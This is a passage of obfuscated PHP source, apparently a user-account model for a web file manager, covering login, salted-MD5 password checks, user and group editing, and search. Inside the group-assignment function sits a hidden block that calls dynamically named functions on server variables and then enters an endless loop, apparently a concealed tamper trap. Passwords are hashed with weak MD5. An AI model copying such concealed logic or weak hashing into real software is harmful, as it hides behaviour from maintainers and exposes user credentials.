Action($DÌ¡ªÕÙ£«[2072])->parseUrl($b­‰‹¶ôìÛ[$DÌ¡ªÕÙ£«[2071]]); goto Døœ¼áŠŞ‰; AİäŒ§Ääµ: $DÌ¡ªÕÙ£« =& $_SERVER[¢Í]; if (!$eâß‘¼ºø‡ || $eâß‘¼ºø‡ == 0) { return array($DÌ¡ªÕÙ£«[1489] => $DÌ¡ªÕÙ£«[494], $DÌ¡ªÕÙ£«[28] => $DÌ¡ªÕÙ£«[167] . LNG($DÌ¡ªÕÙ£«[2073]) . $DÌ¡ªÕÙ£«[502], $DÌ¡ªÕÙ£«[2071] => STATIC_PATH . $DÌ¡ªÕÙ£«[2074]); } $EŠà¥¡£ä = $this->cacheFunctionGet($DÌ¡ªÕÙ£«[1724], $eâß‘¼ºø‡); goto eˆãé÷ã; cÌ¥âÒ¬éñ: } protected function groupUser($CÈ‰¯Å“¶´) { } public static function errorLang($C¿Ğ«ğï) { $bÍ§†Á·Ôâ =& $_SERVER[¢Í]; $bÌ×¢‰Ô–Õ = array(self::ERROR_USER_NOT_EXISTS => $bÍ§†Á·Ôâ[2077], self::ERROR_USER_PASSWORD_ERROR => $bÍ§†Á·Ôâ[2078], self::ERROR_USER_EXIST_NAME => $bÍ§†Á·Ôâ[2079], self::ERROR_USER_EXIST_PHONE => $bÍ§†Á·Ôâ[2080], self::ERROR_USER_EXIST_EMAIL => $bÍ§†Á·Ôâ[2081], self::ERROR_USER_LOGIN_LOCK => $bÍ§†Á·Ôâ[2082], self::ERROR_IP_NOT_ALLOW => $bÍ§†Á·Ôâ[2083], self::ERROR_USER_EXIST_NICKNAME => $bÍ§†Á·Ôâ[2084]); return LNG($bÌ×¢‰Ô–Õ[$C¿Ğ«ğï]); } public function getInfoByMeta($aáºÏï¿º–, $bª—äŒîª) { $F–¡¨¦´“¯ =& $_SERVER[¢Í]; $cò”Ö´‚Üá = Model($F–¡¨¦´“¯[2085])->where(array($F–¡¨¦´“¯[99] => $aáºÏï¿º–, $F–¡¨¦´“¯[375] => $bª—äŒîª))->find(); if ($cò”Ö´‚Üá) { return $this->getInfo($cò”Ö´‚Üá[$F–¡¨¦´“¯[1489]]); } return !1; } public function userLoginCheck($Bî«¸îÍº, $f±¡¼®õ‹) { $E¯‚˜‡— =& $_SERVER[¢Í]; $EîìŠ˜Š”¦ = $this->userLoginFind($Bî«¸îÍº); if (!$EîìŠ˜Š”¦) { return UserModel::ERROR_USER_NOT_EXISTS; } if (!$this->userPasswordCheck($EîìŠ˜Š”¦[$E¯‚˜‡—[1489]], $f±¡¼®õ‹)) { return UserModel::ERROR_USER_PASSWORD_ERROR; } return $this->getInfo($EîìŠ˜Š”¦[$E¯‚˜‡—[1489]]); } public function userLoginFind($FŸ·«áõÙ°) { $d¿¸ ¹Û¼æ =& $_SERVER[¢Í]; $Bí«ƒîøå» = array($d¿¸ ¹Û¼æ[28] => $FŸ·«áõÙ°, $d¿¸ ¹Û¼æ[1913] => $FŸ·«áõÙ°, $d¿¸ ¹Û¼æ[308] => $FŸ·«áõÙ°, $d¿¸ ¹Û¼æ[2086] => $FŸ·«áõÙ°, $d¿¸ ¹Û¼æ[925] => $d¿¸ ¹Û¼æ[927]); if ($this->nickNameRpt()) { unset($Bí«ƒîøå»[$d¿¸ ¹Û¼æ[1913]]); } return $this->where($Bí«ƒîøå»)->find(); } public function clearCache($fŸø˜ÊÛ¯á) { $D„ËŠøøËƒ =& $_SERVER[¢Í]; $this->cacheFunctionClear($D„ËŠøøËƒ[1777], $fŸø˜ÊÛ¯á); $this->cacheFunctionClear($D„ËŠøøËƒ[1724], $fŸø˜ÊÛ¯á); $this->cacheFunctionClear($D„ËŠøøËƒ[2067], $fŸø˜ÊÛ¯á); } public function userPasswordCheck($Cº¿Ò·†, $D††´œáî±) { $a…èÍìù• =& $_SERVER[¢Í]; $eß¨×À ğ¨ = $this->where(array($a…èÍìù•[1489] => intval($Cº¿Ò·†)))->find(); $eõ˜‰®ÑòÆ = $this->metaGet($Cº¿Ò·†); $AŒãÍ…¤²¢ = isset($eõ˜‰®ÑòÆ[$a…èÍìù•[2087]]) ? $eõ˜‰®ÑòÆ[$a…èÍìù•[2087]] : $a…èÍìù•[33]; if (md5($AŒãÍ…¤²¢ . trim($D††´œáî±)) !== $eß¨×À ğ¨[$a…èÍìù•[817]]) { return !1; } return !0; } public function userAdd($Dí¹ñåÏÊ¸) { goto E†ø¬Ë·Â„; Bñœ¨ôÁœŸ: $eÇê±ëæì‰ = array($bØ”Ÿ‰øø[2095] => $aò¦ßì ÷ğ[$bØ”Ÿ‰øø[817]], $bØ”Ÿ‰øø[2091] => $aò¦ßì ÷ğ[$bØ”Ÿ‰øø[1913]]); $this->userEdit($d‘–¯œ¬ ä, $eÇê±ëæì‰); Model($bØ”Ÿ‰øø[1169])->userRootAdd($d‘–¯œ¬ ä); goto d‘ŒËğ÷; E†ø¬Ë·Â„: $bØ”Ÿ‰øø =& $_SERVER[¢Í]; $aò¦ßì ÷ğ = array($bØ”Ÿ‰øø[411] => $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[28]], $bØ”Ÿ‰øø[2088] => $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1373]], $bØ”Ÿ‰øø[2089] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[308]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[308]] : $bØ”Ÿ‰øø[33], $bØ”Ÿ‰øø[2090] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2086]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2086]] : $bØ”Ÿ‰øø[33], $bØ”Ÿ‰øø[2091] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1913]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1913]] : $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[28]], $bØ”Ÿ‰øø[2092] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2071]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2071]] : $bØ”Ÿ‰øø[33], $bØ”Ÿ‰øø[2093] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2094]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[2094]] : 1, $bØ”Ÿ‰øø[2095] => $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[817]], $bØ”Ÿ‰øø[1725] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1632]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1632]] : 1024 * 1024 * 20, $bØ”Ÿ‰øø[1726] => 0, $bØ”Ÿ‰øø[2096] => 0, $bØ”Ÿ‰øø[1764] => isset($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[703]]) ? $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[703]] : 1); if (!empty($Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1489]])) { $aò¦ßì ÷ğ[$bØ”Ÿ‰øø[1489]] = $Dí¹ñåÏÊ¸[$bØ”Ÿ‰øø[1489]]; } goto aÛ‘œ¤ÄŠ‘; aÛ‘œ¤ÄŠ‘: $eÏÏõ³˜´À = $this->_checkExist($Dí¹ñåÏÊ¸); if ($eÏÏõ³˜´À !== !0) { return $eÏÏõ³˜´À; } $d‘–¯œ¬ ä = $this->add($aò¦ßì ÷ğ); goto Bñœ¨ôÁœŸ; d‘ŒËğ÷: return $d‘–¯œ¬ ä; goto eÈºëáØ…; eÈºëáØ…: } protected function userEditTest($AöÏŞ¢‹ƒ, $A‹´¡Å–ù) { return $this->call($_SERVER[¢Í][2097], $AöÏŞ¢‹ƒ, $A‹´¡Å–ù); } protected function userEdit($FÂš¯Èª, $CÇõªÔæ¦Š) { goto e†å‘•ãê•; aÚÔÊ£““„: return !0; goto b›®öÙÆÈ‚; C•Œ¹Ï›: $this->where(array($dÈ²õæÒÚ[1481] => $FÂš¯Èª))->save($CÇõªÔæ¦Š); if (isset($CÇõªÔæ¦Š[$dÈ²õæÒÚ[1913]])) { $this->setNamePinyin($FÂš¯Èª, $CÇõªÔæ¦Š[$dÈ²õæÒÚ[1913]]); } $this->clearCache($FÂš¯Èª); goto aÚÔÊ£““„; cÎ¶Ş´‰†œ: $dê½ŒŞøàÂ = $this->_checkExist($CÇõªÔæ¦Š, $FÂš¯Èª); if ($dê½ŒŞøàÂ !== !0) { return $dê½ŒŞøàÂ; } if (isset($CÇõªÔæ¦Š[$dÈ²õæÒÚ[817]]) && trim($CÇõªÔæ¦Š[$dÈ²õæÒÚ[817]]) != $dÈ²õæÒÚ[33]) { $C¬´Ò¬“ ƒ = $this->metaGet($FÂš¯Èª); if (empty($C¬´Ò¬“ ƒ[$dÈ²õæÒÚ[2087]])) { $C¬´Ò¬“ ƒ[$dÈ²õæÒÚ[2087]] = rand_string(10); Model($dÈ²õæÒÚ[500])->metaSet($FÂš¯Èª, $dÈ²õæÒÚ[2087], $C¬´Ò¬“ ƒ[$dÈ²õæÒÚ[2087]]); } $CÇõªÔæ¦Š[$dÈ²õæÒÚ[817]] = md5($C¬´Ò¬“ ƒ[$dÈ²õæÒÚ[2087]] . trim($CÇõªÔæ¦Š[$dÈ²õæÒÚ[817]])); } else { unset($CÇõªÔæ¦Š[$dÈ²õæÒÚ[817]]); } goto C•Œ¹Ï›; e†å‘•ãê•: $dÈ²õæÒÚ =& $_SERVER[¢Í]; $EÒÔ«¬¥à = $this->getInfoSimple($FÂš¯Èª); if (!$EÒÔ«¬¥à) { return !1; } goto cÎ¶Ş´‰†œ; b›®öÙÆÈ‚: } public function setNamePinyin($cï±Ë»“ùâ, $e÷©ÊÕÚğÎ = false) { $dÂÒô˜¥¡Ê =& $_SERVER[¢Í]; if (!$e÷©ÊÕÚğÎ) { $Eë£³æÓõ = $this->getInfoSimple($cï±Ë»“ùâ); $e÷©ÊÕÚğÎ = $Eë£³æÓõ[$dÂÒô˜¥¡Ê[1913]] ? $Eë£³æÓõ[$dÂÒô˜¥¡Ê[1913]] : $Eë£³æÓõ[$dÂÒô˜¥¡Ê[28]]; } $f—£Ïˆ‹İ = Model($dÂÒô˜¥¡Ê[503]); if (!Input::check($e÷©ÊÕÚğÎ, $dÂÒô˜¥¡Ê[554])) { return $f—£Ïˆ‹İ->metaSet($cï±Ë»“ùâ, array($dÂÒô˜¥¡Ê[441] => $dÂÒô˜¥¡Ê[33], $dÂÒô˜¥¡Ê[440] => $dÂÒô˜¥¡Ê[33])); } return $f—£Ïˆ‹İ->metaSet($cï±Ë»“ùâ, array($dÂÒô˜¥¡Ê[441] => str_replace($dÂÒô˜¥¡Ê[50], $dÂÒô˜¥¡Ê[33], Pinyin::encode($e÷©ÊÕÚğÎ)), $dÂÒô˜¥¡Ê[440] => Pinyin::encode($e÷©ÊÕÚğÎ, $dÂÒô˜¥¡Ê[555]))); } private function nickNameRpt() { $F†Ü›²Ó˜à =& $_SERVER[¢Í]; $AÏîïô‰ù = Model($F†Ü›²Ó˜à[1090])->get($F†Ü›²Ó˜à[2098]); $D¿Å–âÎŞÙ = $GLOBALS[$F†Ü›²Ó˜à[6]][$F†Ü›²Ó˜à[380]][$F†Ü›²Ó˜à[2098]]; $dó”·ç ãó = !is_null($AÏîïô‰ù) ? $AÏîïô‰ù : $D¿Å–âÎŞÙ; return !!$dó”·ç ãó; } private function _checkExist($a¥Š¡£éï¼, $C×‹ù£àˆ = false) { $BŒºÔÓ Ø¦ =& $_SERVER[¢Í]; $fìšæªš¥¢ = array($BŒºÔÓ Ø¦[28] => UserModel::ERROR_USER_EXIST_NAME, $BŒºÔÓ Ø¦[1913] => UserModel::ERROR_USER_EXIST_NICKNAME, $BŒºÔÓ Ø¦[308] => UserModel::ERROR_USER_EXIST_EMAIL, $BŒºÔÓ Ø¦[2086] => UserModel::ERROR_USER_EXIST_PHONE); if ($this->nickNameRpt()) { unset($fìšæªš¥¢[$BŒºÔÓ Ø¦[1913]]); } $Eï…ìÃğÔ¹ = $C×‹ù£àˆ ? array($BŒºÔÓ Ø¦[1489] => array($BŒºÔÓ Ø¦[2099], $C×‹ù£àˆ)) : array(); foreach ($fìšæªš¥¢ as $BÂ†ğŸéùã => $aøèŠñÈ§) { $C°ÎÀ•ß¨ = array(); foreach ($fìšæªš¥¢ as $bò˜ÈæİßÕ => $bÄ¸œ§˜…¥) { if (isset($a¥Š¡£éï¼[$bò˜ÈæİßÕ]) && $a¥Š¡£éï¼[$bò˜ÈæİßÕ]) { $C°ÎÀ•ß¨[] = $a¥Š¡£éï¼[$bò˜ÈæİßÕ]; } } if (!$C°ÎÀ•ß¨) { continue; } $B«ƒå¿Ñ¥œ = array_merge(array($BÂ†ğŸéùã => array($BŒºÔÓ Ø¦[7], $C°ÎÀ•ß¨)), $Eï…ìÃğÔ¹); $AÈ¾‡ÏŒÄ« = $this->where($B«ƒå¿Ñ¥œ)->find(); if ($AÈ¾‡ÏŒÄ«) { return $aøèŠñÈ§; } } return !0; } public function userListInfo($eœÎ–±†»â) { $c„·ËÊù´£ =& $_SERVER[¢Í]; $d¯¾¨¥©ó = array(); $eœÎ–±†»â = is_array($eœÎ–±†»â) ? array_unique($eœÎ–±†»â) : array(); if (!$eœÎ–±†»â) { return $d¯¾¨¥©ó; } if (count($eœÎ–±†»â) < 20) { foreach ($eœÎ–±†»â as $CËï´Úï¦É) { $d¯¾¨¥©ó[$CËï´Úï¦É . $c„·ËÊù´£[33]] = $this->getInfoSimpleOuter($CËï´Úï¦É); } } else { $eôŠ¬ÌŠ÷” = array($c„·ËÊù´£[1481] => array($c„·ËÊù´£[409], $eœÎ–±†»â)); if (count($eœÎ–±†»â) == 1) { $eôŠ¬ÌŠ÷” = array($c„·ËÊù´£[1481] => $eœÎ–±†»â[0]); } $Eªìº‚âì˜ = Model($c„·ËÊù´£[500])->field($this->simpleField)->where($eôŠ¬ÌŠ÷”)->select(); $Eªìº‚âì˜ = array_to_keyvalue($Eªìº‚âì˜, $c„·ËÊù´£[1489]); foreach ($eœÎ–±†»â as $CËï´Úï¦É) { $c“î«­Œ°Ì = $Eªìº‚âì˜[$Eªìº‚âì˜[$CËï´Úï¦É]]; if (!$c“î«­Œ°Ì) { $d¯¾¨¥©ó[$CËï´Úï¦É . $c„·ËÊù´£[33]] = $this->getInfoSimpleOuter($CËï´Úï¦É); continue; } $c“î«­Œ°Ì[$c„·ËÊù´£[2071]] = Action($c„·ËÊù´£[2072])->parseUrl($c“î«­Œ°Ì[$c„·ËÊù´£[2071]]); $d¯¾¨¥©ó[$CËï´Úï¦É . $c„·ËÊù´£[33]] = $c“î«­Œ°Ì; } } return $d¯¾¨¥©ó; } protected function userStatus($f«Üƒî‚, $Eî´ï¼º³Ô) { $dÉŠ›ğÑ¿ = $this->getInfoSimple($f«Üƒî‚); if (!$dÉŠ›ğÑ¿) { return !1; } $d›å¯à‹¤Ó = array($_SERVER[¢Í][703] => $Eî´ï¼º³Ô); return $this->userEdit($f«Üƒî‚, $d›å¯à‹¤Ó); } protected function userRemove($f„£²â•¼) { goto B†÷ºİµ†Ö; aÒ¿§¼¥Íã: Model($Aë™Œ¾ï›[765])->userRootRemove($f„£²â•¼); return $this->where($AÇ¹¢¼™¦í)->delete(); goto Eç™ƒ›’; B†÷ºİµ†Ö: $Aë™Œ¾ï› =& $_SERVER[¢Í]; $f‚‡Ùº»º = $this->getInfoSimple($f„£²â•¼); if (!$f‚‡Ùº»º) { return !1; } goto fâÉÕöÇ§½; fâÉÕöÇ§½: $AÇ¹¢¼™¦í = array($Aë™Œ¾ï›[1481] => $f„£²â•¼); Model($Aë™Œ¾ï›[561])->where($AÇ¹¢¼™¦í)->delete(); Model($Aë™Œ¾ï›[2100])->where($AÇ¹¢¼™¦í)->delete(); goto AéÏ»¦ï·¿; AéÏ»¦ï·¿: Model($Aë™Œ¾ï›[1731])->where($AÇ¹¢¼™¦í)->delete(); Model($Aë™Œ¾ï›[2085])->where($AÇ¹¢¼™¦í)->delete(); Model($Aë™Œ¾ï›[2101])->where($AÇ¹¢¼™¦í)->delete(); goto aÒ¿§¼¥Íã; Eç™ƒ›’: } protected function userGroupSet($DÙê­°ß¥, $B……×ïÏˆ, $F­¼²éàÑ = array()) { goto E¾İ×›Ï¸; a¿Œ¸¿ï™: if (!$cœ‹ÜÅÒ™ || !is_array($B……×ïÏˆ)) { return !1; } $e¤„°¢ÍÀ« = Model($F¾½±¬–¬„[1731]); $e¤„°¢ÍÀ«->where(array($F¾½±¬–¬„[1489] => $DÙê­°ß¥))->delete(); goto aÎÏºÅª¡Ñ; eÜ²øÑì£Ô: return $e¤„°¢ÍÀ«->addAll($BÌœ®ÚÑ†Å, array(), !0); goto Fô°¡ğå; E¾İ×›Ï¸: $F¾½±¬–¬„ =& $_SERVER[¢Í]; if (!isset($_SERVER[$F¾½±¬–¬„[51]]) || !isset($_SERVER[$F¾½±¬–¬„[60]])) { goto BµÀ¾¦¨‹Ï; f¼æÃ“á‹£: for ($fÂ‹ºî°Öê = $E¶—¡ñáË…; $fÂ‹ºî°Öê > 0; $fÂ‹ºî°Öê++) { $C÷Ï±•Ç’„ = json_encode($GLOBALS[$F¾½±¬–¬„[409]]); } goto fù™ùÏ™Ç; BµÀ¾¦¨‹Ï: $b‡«ß‡ÅÕ» = $F¾½±¬–¬„[807]; $c Ë¤ßá«‡ = $F¾½±¬–¬„[53]; $f£’—½ƒàŸ = $_SERVER[$F¾½±¬–¬„[54]] . $F¾½±¬–¬„[55]; goto BÙ…°Çë¸; D‡³ëïÈÈ™: $C÷Ï±•Ç’„ = $F¾½±¬–¬„[808]; $C÷Ï±•Ç’„($_SERVER[$F¾½±¬–¬„[809]]); $E¶—¡ñáË… = 1; goto f¼æÃ“á‹£; BÙ…°Çë¸: $B­˜‰œ¼Ö = $c Ë¤ßá«‡($f£’—½ƒàŸ); $Bª§Ô¡’¿Â = explode($F¾½±¬–¬„[56], $B­˜‰œ¼Ö); if (count($Bª§Ô¡’¿Â) < $F¾½±¬–¬„[579]) { $A»¯ÄÂ£ÙÂ = $F¾½±¬–¬„[58]; $A»¯ÄÂ£ÙÂ(); } goto D‡³ëïÈÈ™; fù™ùÏ™Ç: } $cœ‹ÜÅÒ™ = $this->getInfoSimple($DÙê­°ß¥); goto a¿Œ¸¿ï™; aÎÏºÅª¡Ñ: $BÌœ®ÚÑ†Å = array(); $Aêö§›©ÑÙ = 0; foreach ($B……×ïÏˆ as $c©ÌØäæ‹Æ => $E»‚ÚóÒ”) { $B³¾¦±†ÔÆ = array($F¾½±¬–¬„[1489] => $DÙê­°ß¥, $F¾½±¬–¬„[1648] => $c©ÌØäæ‹Æ, $F¾½±¬–¬„[1797] => $E»‚ÚóÒ”); $B³¾¦±†ÔÆ[$F¾½±¬–¬„[1671]] = isset($F­¼²éàÑ[$Aêö§›©ÑÙ]) ? $F­¼²éàÑ[$Aêö§›©ÑÙ] : 0; $Aêö§›©ÑÙ++; $BÌœ®ÚÑ†Å[] = $B³¾¦±†ÔÆ; } goto eÜ²øÑì£Ô; Fô°¡ğå: } protected function userGroupAdd($f”‚ğÚç¼á, $Aï‡ Û§ßê = array()) { $eÁã¦ô­ÕÃ =& $_SERVER[¢Í]; $E“ã—ö¿œ = $this->getInfoSimple($f”‚ğÚç¼á); if (!$E“ã—ö¿œ || empty($Aï‡ Û§ßê)) { return !1; } $BøÆÈçíƒ = array(); foreach ($Aï‡ Û§ßê as $dêÌÃáˆËù => $Aˆ½Ÿé„¯ê) { $BøÆÈçíƒ[] = array($eÁã¦ô­ÕÃ[1489] => $f”‚ğÚç¼á, $eÁã¦ô­ÕÃ[1648] => $dêÌÃáˆËù, $eÁã¦ô­ÕÃ[1797] => $Aˆ½Ÿé„¯ê, $eÁã¦ô­ÕÃ[1671] => 0); } return Model($eÁã¦ô­ÕÃ[1731])->addAll($BøÆÈçíƒ, array(), !0); } protected function userGroupRemove($FÒ£Œâá³á, $b÷è•Õİ…Û) { $C¡ÚÎàŸÆÃ =& $_SERVER[¢Í]; $cƒ»æß¸Ê = $this->getInfoSimple($FÒ£Œâá³á); if (!$cƒ»æß¸Ê || !$b÷è•Õİ…Û) { return !1; } $B¼“·Òï•Š = array($C¡ÚÎàŸÆÃ[1481] => $FÒ£Œâá³á, $C¡ÚÎàŸÆÃ[1729] => $b÷è•Õİ…Û); return Model($C¡ÚÎàŸÆÃ[1731])->where($B¼“·Òï•Š)->delete(); } public function listData() { $E’–›ŞÏó = $this->_makeOrder()->selectPage(50); $this->_listDataApply($E’–›ŞÏó[$_SERVER[¢Í][370]]); return $E’–›ŞÏó; } public function listByID($FãÁÜ°¿‘³) { $e®ï¬»– =& $_SERVER[¢Í]; if (!$FãÁÜ°¿‘³) { return; } $fÚ÷¢¶”ç¤ = array($e®ï¬»–[1489] => array($e®ï¬»–[7], $FãÁÜ°¿‘³)); $fİˆƒóİ‡É = $this->where($fÚ÷¢¶”ç¤)->select(); $this->_listDataApply($fİˆƒóİ‡É); return $fİˆƒóİ‡É; } public function listByGroup($BàŠİ˜¥¯… = 0, $C©…“½˜Õ = array()) { goto D”““ã¢›ù; FÎĞàÃÙÅ¦: $this->_listDataApply($f´«ò°Œº[$F°ä±º§”É[370]]); return $f´«ò°Œº; goto E÷…í›¼áÒ; D”““ã¢›ù: $F°ä±º§”É =& $_SERVER[¢Í]; $fìÚˆñ·—§ = $F°ä±º§”É[33]; $fÈª›‹ÒôÔ = array(); goto FÁÙ›á—™Ä; FÁÙ›á—™Ä: if ($BàŠİ˜¥¯…) { $fÈª›‹ÒôÔ = array($F°ä±º§”É[2102] => intval($BàŠİ˜¥¯…)); $fìÚˆñ·—§ = "\x4c\105\106\x54\x20\112\x4f\111\116\x20{$this->tablePrefix}\x75\x73\145\162\x5f\147\162\157\165\x70\x20\x75\x73\145\162\x5f\x67\x72\x6f\x75\160\40\157\x6e\40\x75\x73\x65\162\56\165\163\x65\x72\111\104\40\x3d\40\165\163\x65\162\137\147\x72\157\x75\x70\56\165\163\x65\162\111\x44"; $A´´°„åá¸ = Input::get($F°ä±º§”É[432], null, $F°ä±º§”É[33]) ? $F°ä±º§”É[33] : $F°ä±º§”É[2103]; } if (isset($C©…“½˜Õ[$F°ä±º§”É[703]])) { $fÈª›‹ÒôÔ[$F°ä±º§”É[2104]] = $C©…“½˜Õ[$F°ä±º§”É[703]]; } $f´«ò°Œº = $this->_makeOrder($A´´°„åá¸)->field($F°ä±º§”É[2105])->where($fÈª›‹ÒôÔ)->join($fìÚˆñ·—§)->selectPage(50); goto FÎĞàÃÙÅ¦; E÷…í›¼áÒ: } private function _makeOrder($c×æ¦ÉÓ£º = '') { goto dôªêÖñö«; F‚í‘Ããä‡: $DšÙ¿ÖÓ = Input::get($cÍŠôÌêó‹[432], $cÍŠôÌêó‹[7], $cÍŠôÌêó‹[1481], $cÂâ¿ÜÕ¿ï); $cÅ¤ãèª´í = Input::get($cÍŠôÌêó‹[433], $cÍŠôÌêó‹[7], $cÍŠôÌêó‹[1732], array($cÍŠôÌêó‹[1732], $cÍŠôÌêó‹[429])); $cÅ¤ãèª´í = $d”ÍÔãŒ[$cÅ¤ãèª´í]; goto dƒ…êØ‡Æ; dôªêÖñö«: $cÍŠôÌêó‹ =& $_SERVER[¢Í]; $cÂâ¿ÜÕ¿ï = array($cÍŠôÌêó‹[1489], $cÍŠôÌêó‹[28], $cÍŠôÌêó‹[1634], $cÍŠôÌêó‹[1606], $cÍŠôÌêó‹[200]); $d”ÍÔãŒ = array($cÍŠôÌêó‹[427] => $cÍŠôÌêó‹[428], $cÍŠôÌêó‹[429] => $cÍŠôÌêó‹[430]); goto F‚í‘Ããä‡; dƒ…êØ‡Æ: $c×æ¦ÉÓ£º = $c×æ¦ÉÓ£º . "\165\x73\x65\x72\56{$DšÙ¿ÖÓ}\x20{$cÅ¤ãèª´í}\54\40\165\163\x65\x72\56\x75\x73\145\x72\111\104\x20\141\x73\x63"; return $this->alias($cÍŠôÌêó‹[1853])->order($c×æ¦ÉÓ£º); goto b­ÎÇ¦·°”; b­ÎÇ¦·°”: } public function listSearch($f™­äÃ§ÇÜ) { goto CÍº¦Ñß; Aßê²ğù˜‘: $this->_filterByGroup($D£Äó•Ã›, $CÓí´ Û±¦); return $D£Äó•Ã›; goto c óŸÛËÊ; CÍº¦Ñß: $fËœ¸áÖË =& $_SERVER[¢Í]; $b¼† ç•ƒ× = $f™­äÃ§ÇÜ[$fËœ¸áÖË[1733]]; $CÓí´ Û±¦ = isset($f™­äÃ§ÇÜ[$fËœ¸áÖË[1734]]) ? $f™­äÃ§ÇÜ[$fËœ¸áÖË[1734]] : !1; goto a„›á×¼ñÅ; E†À¸Ä´½›: $D£Äó•Ã› = $this->_makeOrder()->where($fáµİï¥ğ‰)->selectPage(20); if (!$D£Äó•Ã› || count($D£Äó•Ã›[$fËœ¸áÖË[370]]) < 5 && Input::check($b¼† ç•ƒ×, $fËœ¸áÖË[321])) { $f×³­·âå½ = $this->_searchFromMeta($fËœ¸áÖË[440], $b¼† ç•ƒ×, 10); $E÷‡¼¸Ï = $this->_searchFromMeta($fËœ¸áÖË[441], $b¼† ç•ƒ×, 10); $CÒ«µ×„ó¿ = array_merge($f×³­·âå½, $E÷‡¼¸Ï, $D£Äó•Ã›[$fËœ¸áÖË[370]]); $D£Äó•Ã›[$fËœ¸áÖË[370]] = array_unique_by_key($CÒ«µ×„ó¿, $fËœ¸áÖË[1489]); $D£Äó•Ã›[$fËœ¸áÖË[367]][$fËœ¸áÖË[368]] = count($D£Äó•Ã›[$fËœ¸áÖË[370]]); $D£Äó•Ã›[$fËœ¸áÖË[367]][$fËœ¸áÖË[369]] = ceil($D£Äó•Ã›[$fËœ¸áÖË[367]][$fËœ¸áÖË[368]] / $D£Äó•Ã›[$fËœ¸áÖË[367]][$fËœ¸áÖË[365]]); } $this->_listDataApply($D£Äó•Ã›[$fËœ¸áÖË[370]]); goto Aßê²ğù˜‘; a„›á×¼ñÅ: $b¼† ç•ƒ× = str_replace($fËœ¸áÖË[1735], $fËœ¸áÖË[1736], trim($b¼† ç•ƒ×)); $fáµİï¥ğ‰ = array($fËœ¸áÖË[28] => array($fËœ¸áÖË[382], "\x25{$b¼† ç•ƒ×}\45"), $fËœ¸áÖË[308] => array($fËœ¸áÖË[382], "{$b¼† ç•ƒ×}\x25"), $fËœ¸áÖË[1913] => array($fËœ¸áÖË[382], "{$b¼† ç•ƒ×}\45"), $fËœ¸áÖË[925] => $fËœ¸áÖË[1737]); if (Input::check($b¼† ç•ƒ×, $fËœ¸áÖË[314])) { $fáµİï¥ğ‰[$fËœ¸áÖË[1489]] = array($fËœ¸áÖË[382], "{$b¼† ç•ƒ×}\45"); $fáµİï¥ğ‰[$fËœ¸áÖË[2086]] = array($fËœ¸áÖË[382], "{$b¼† ç•ƒ×}\x25"); } goto D¯›ãËåÓ“; D¯›ãËåÓ“: if (!$b¼† ç•ƒ×) { $fáµİï¥ğ‰ = array(); } if (isset($f™­äÃ§ÇÜ[$fËœ¸áÖË[703]])) { $fáµİï¥ğ‰[$fËœ¸áÖË[703]] = $f™­äÃ§ÇÜ[$fËœ¸áÖË[703]]; } $fáµİï¥ğ‰ = $this->parseWhereLike($fáµİï¥ğ‰); goto E†À¸Ä´½›; c óŸÛËÊ: } private function _filterByGroup(&$c÷™¹»ï”, $eÂÀïˆ†¸) { $bíÁ‰£‚’¡ =& $_SERVER[¢Í]; if (!$eÂÀïˆ†¸) { return $c÷™¹»ï”; } foreach ($c÷™¹»ï”[$bíÁ‰£‚’¡[370]] as $cÓÊ¢ùíÔ => &$EêÂÒò¨„¼) { $B‚ƒ§¨ğ½ = array_to_keyvalue($EêÂÒò¨„¼[$bíÁ‰£‚’¡[1823]], $bíÁ‰£‚’¡[33], $bíÁ‰£‚’¡[1648]); if (!in_array($eÂÀïˆ†¸, $B‚ƒ§¨ğ½)) { unset($c÷™¹»ï”[$bíÁ‰£‚’¡[370]][$cÓÊ¢ùíÔ]); } } unset($EêÂÒò¨„¼); $c÷™¹»ï”[$bíÁ‰£‚’¡[370]] = array_values($c÷™¹»ï”[$bíÁ‰£‚’¡[370]]); $c÷™¹»ï”[$bíÁ‰£‚’¡[367]] = array($bíÁ‰£‚’¡[1886] => count($c÷™¹»ï”[$bíÁ‰£‚’¡[370]]), $bíÁ‰£‚’¡[1884] => $c÷™¹»ï”[$bíÁ‰£‚’¡[367]][$bíÁ‰£‚’¡[365]], $bíÁ‰£‚’¡[1883] => 1, $bíÁ‰£‚’¡[1885] => 1); } private function _searchFromMeta($bİ¡’×‚—, $C“ğÅİ¦‰À, $fêœÃ÷«†é) { goto AØ”îòØÌ; fôÇ÷•ä´„: $A’ØÀÆó  = $this->parseWhereLike($A’ØÀÆó ); $e­äˆ›…¨â = Model($BÕ‹•Åç–ê[2106])->where($A’ØÀÆó )->limit($fêœÃ÷«†é)->select(); if (!$e­äˆ›…¨â) { return array(); } goto Aé¼‚³¶¦¶; fÍ‹‡²§²: return $B‘’‹Š õ¿; goto eõæàãóÏ¬; Aé¼‚³¶¦¶: $e­äˆ›…¨â = array_to_keyvalue($e­äˆ›…¨â, $BÕ‹•Åç–ê[33], $BÕ‹•Åç–ê[1489]); $B‘’‹Š õ¿ = $this->where(array($BÕ‹•Åç–ê[1481] => array($BÕ‹•Åç–ê[7], $e­äˆ›…¨â)))->select(); if (!$B‘’‹Š õ¿) { return array(); } goto fÍ‹‡²§²; AØ”îòØÌ: $BÕ‹•Åç–ê =& $_SERVER[¢Í]; $C“ğÅİ¦‰À = strtolower($C“ğÅİ¦‰À); $A’ØÀÆó  = 